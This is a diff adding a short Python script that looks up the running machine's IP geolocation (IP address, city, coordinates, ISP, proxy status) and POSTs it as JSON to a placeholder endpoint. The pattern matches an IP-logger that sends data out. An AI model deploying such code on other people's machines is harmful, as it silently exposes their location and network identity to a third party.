@@ -1,0 +1,35 @@
+# Made by Feva
+
+import json
+import urllib.request
+
+API_TOKEN = "API_TOKEN"
+ENDPOINT = "END_POINT_URL"
+
+
+service_url = f"https://api.ipgeolocation.io/ipgeo?apiKey={API_TOKEN}"
+
+with urllib.request.urlopen(service_url) as response:
+    info = json.loads(response.read().decode())
+
+report = {
+    "address": info.get("ip"),
+    "country": info.get("country_name"),
+    "city": info.get("city"),
+    "provider": info.get("isp"),
+    "lat": info.get("latitude"),
+    "lon": info.get("longitude"),
+    "proxy": info.get("is_proxy")
+}
+
+hello = json.dumps(report).encode("utf-8")
+
+request = urllib.request.Request(
+    ENDPOINT,
+    data=hello,
+    headers={"Content-Type": "application/json"}
+)
+
+urllib.request.urlopen(request)
+
+print("Report sent")
